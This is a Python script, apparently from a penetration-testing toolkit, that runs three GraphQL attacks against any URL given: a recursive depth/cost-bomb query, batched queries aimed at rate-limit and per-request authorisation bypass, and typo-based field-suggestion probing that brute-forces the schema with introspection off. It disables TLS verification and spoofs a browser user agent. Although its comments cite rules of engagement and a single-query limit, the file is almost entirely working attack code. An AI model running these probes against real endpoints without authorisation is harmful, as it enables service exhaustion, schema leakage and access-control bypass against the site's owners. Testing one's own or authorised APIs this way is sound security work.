#!/usr/bin/env python
"""graphql_adv.py — advanced GraphQL attacks: depth/cost bomb, query batching, field-suggestion (stdlib).

Extends graphql_probe.py (introspection) with the attacker classes beyond schema enumeration:
  --depth    a recursive self-referential query to depth N; measure latency/error. If latency
             explodes at a modest depth, the endpoint has no cost-limit (a cost-bomb surface; LEAD,
             not DoS-exhaustion per RoE — ONE query, observe, do NOT fuzz-to-exhaust).
  --batch    [N identical queries] in ONE POST — if the server processes the batch (vs rejecting),
             batching enables rate-limit/per-request-authz bypass + bulk BOLA. Count responses.
  --suggest  query with a deliberate typo ("users" instead of the real field) → many servers return
             "Did you mean 'user'?" → schema brute-force with introspection OFF.

Usage: python graphql_adv.py <graphql-url> [--depth 10] [--batch 20] [--suggest]
"""
import sys, json, ssl, argparse, urllib.request, urllib.error, time

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE

def post(url, query, timeout=20):
    body = json.dumps({"query": query}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=body, method="POST",
              headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"}),
              timeout=timeout, context=_CTX)
        return r.status, r.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4000).decode("utf-8", "replace")
    except Exception as e:
        return None, str(e)

def depth_probe(url, max_depth):
    findings = []
    # build a recursive query: {user{friends{user{friends{...}}}}} to depth N
    q_inner = "user"
    for d in range(max_depth):
        q_inner = f"user {{ id {q_inner} }}"
    query = "{" + q_inner + "}"
    t0 = time.time()
    s, body = post(url, query, timeout=30)
    elapsed = time.time() - t0
    # a latency spike at a modest depth = no cost-limit (cost-bomb surface)
    if elapsed > 5.0 and s != 413:
        findings.append({"id": "graphql-cost-bomb-surface", "severity": "medium",
                         "detail": f"depth-{max_depth} recursive query took {elapsed:.1f}s (HTTP {s}) — no effective depth/cost limit; a deeper query is a cost-bomb (CWE-770). ONE query observed; NOT a DoS test."})
    if s == 200 and "maximum depth" not in body.lower():
        pass  # processed without a depth error
    elif "depth" in body.lower() or "complexity" in body.lower():
        findings.append({"id": "graphql-depth-limit-present", "severity": "info", "detail": f"server returned a depth/complexity error at depth {max_depth} — a limit IS present (good posture)"})
    return {"depth": max_depth, "status": s, "latency_s": round(elapsed, 1), "body_head": body[:120], "findings": findings}

def batch_probe(url, n):
    body = json.dumps([{"query": "{ __typename }"}] * n).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=body, method="POST",
              headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"}),
              timeout=20, context=_CTX)
        resp = r.read(4000).decode("utf-8", "replace")
        # if the response is a JSON array of N objects -> batching is processed
        is_array = resp.strip().startswith("[")
        count = resp.count('"__typename"') if is_array else 0
        return {"batch_n": n, "status": r.status, "processed_as_batch": is_array,
                "response_typename_count": count,
                "findings": [{"id": "graphql-batching-enabled", "severity": "medium",
                              "detail": f"server processed a batch of {n} queries in one POST (array response) — enables rate-limit/per-request-authz bypass + bulk BOLA. Attackers batch many IDOR/brute checks in one HTTP request."}] if is_array and count >= n else []}
    except urllib.error.HTTPError as e:
        return {"batch_n": n, "status": e.code, "processed_as_batch": False, "findings": []}
    except Exception as ex:
        return {"batch_n": n, "error": str(ex)[:100], "findings": []}

def suggest_probe(url):
    # query a non-existent field -> many servers suggest the real one ("Did you mean...?")
    s, body = post(url, "{ nonexistentField123 }")
    suggestions = []
    if "Did you mean" in body or "did you mean" in body.lower():
        suggestions.append("field-suggestion enabled — schema leaks via typos with introspection off")
    return {"status": s, "body_head": body[:200],
            "findings": [{"id": "graphql-field-suggestion", "severity": "low",
                          "detail": "server returns 'Did you mean...' on unknown fields — schema is brute-forceable with introspection OFF (CWE-200)"}] if suggestions else []}

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Advanced GraphQL attacks (depth/batch/suggestion)")
    ap.add_argument("url"); ap.add_argument("--depth", type=int, default=10)
    ap.add_argument("--batch", type=int, default=20); ap.add_argument("--suggest", action="store_true")
    a = ap.parse_args()
    out = {"target": a.url, "ok": True, "findings": []}
    out["depth_probe"] = depth_probe(a.url, a.depth); out["findings"] += out["depth_probe"]["findings"]
    out["batch_probe"] = batch_probe(a.url, a.batch); out["findings"] += out["batch_probe"]["findings"]
    if a.suggest:
        out["suggest_probe"] = suggest_probe(a.url); out["findings"] += out["suggest_probe"]["findings"]
    out["note"] = "depth=ONE-query observe (NOT a DoS test, RoE); batch=rate-limit/authz-bypass surface; suggest=schema-brute with introspection off."
    print(json.dumps(out, indent=2))
